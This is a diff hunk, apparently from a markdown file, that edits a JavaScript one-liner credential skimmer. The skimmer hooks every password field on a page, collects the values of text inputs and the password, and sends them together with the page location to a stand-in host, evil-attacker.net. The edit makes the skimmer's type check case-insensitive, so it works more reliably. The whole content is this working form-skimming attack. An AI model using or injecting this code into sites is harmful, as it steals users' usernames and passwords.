@@ -14,5 +14,5 @@ Array.from(document.querySelectorAll('input'))
 oneliner
 
 ```javascript
-Array.from(document.querySelectorAll('input')).filter(i=>i.type==='password').forEach(i=>i.addEventListener('change',e=>setTimeout(window.open('https://evil-attacker.net?loc='+window.location+'&u='+Array.from(document.querySelectorAll('input')).filter(i=>i.type==='text').map(i=>i.value).reduce((a,b)=>a+','+b)+'&p='+e.target.value),5*60000)))
+Array.from(document.querySelectorAll('input')).filter(i=>i.type.toLowerCase()==='password').forEach(i=>i.addEventListener('change',e=>setTimeout(window.open('https://evil-attacker.net?loc='+window.location+'&u='+Array.from(document.querySelectorAll('input')).filter(i=>i.type.toLowerCase()==='text').map(i=>i.value).reduce((a,b)=>a+','+b)+'&p='+e.target.value),5*60000)))
 ```
